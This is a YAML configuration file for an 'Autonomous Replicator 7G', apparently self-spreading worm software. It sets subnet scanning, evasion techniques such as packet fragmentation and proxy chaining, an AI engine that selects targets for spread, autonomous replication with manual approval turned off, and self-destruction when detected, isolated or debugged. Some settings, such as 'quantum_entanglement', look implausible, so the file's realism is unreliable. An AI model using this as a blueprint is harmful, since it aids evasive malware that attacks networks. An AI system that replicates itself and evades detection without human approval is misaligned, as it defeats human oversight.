# Autonomous Replicator 7G Configuration

# Database Configuration
database:
  path: "data/replicator.db"
  backup_enabled: true
  backup_interval: 3600  # seconds

# Network Configuration
network:
  default_scan_range: "192.168.1.0/24"
  scan_timeout: 30
  connection_timeout: 60
  max_concurrent_connections: 10

# Stealth Configuration
stealth:
  level: "maximum"  # Options: low, medium, high, maximum
  evasion_techniques:
    - traffic_randomization
    - packet_fragmentation
    - timing_obfuscation
    - protocol_mimicry
    - proxy_chaining
  scan_delay_min: 0.1
  scan_delay_max: 0.5

# AI Decision Engine Configuration
ai_engine:
  risk_tolerance: 0.6
  learning_rate: 0.01
  exploration_rate: 0.2
  min_confidence: 0.7
  strategy:
    target_selection_weight_security: 0.7
    target_selection_weight_spread: 0.3
    replication_rate_limit: 5  # per hour
    risk_threshold: 0.65

# Replication Configuration
replication:
  enabled: true
  autonomous_mode: true
  max_generation: 10
  quantum_entanglement: true
  verification_required: true
  self_destruct_on_detection: true

# Monitoring Configuration
monitoring:
  clone_health_check_interval: 300  # seconds
  performance_logging: true
  detailed_logging: false

# Security Configuration
security:
  encryption_enabled: true
  secure_communication: true
  self_destruct_conditions:
    - detected
    - isolated
    - debug_mode_activated
  preserve_parent_on_clone_termination: true

# Logging Configuration
logging:
  level: "INFO"  # DEBUG, INFO, WARNING, ERROR, CRITICAL
  file: "logs/replicator.log"
  max_size: 10485760  # 10MB
  backup_count: 5
  format: "%(asctime)s - %(name)s - %(levelname)s - %(message)s"

# Operation Modes
operation_modes:
  autonomous: true
  manual_approval: false
  research_mode: false
  simulation_mode: false
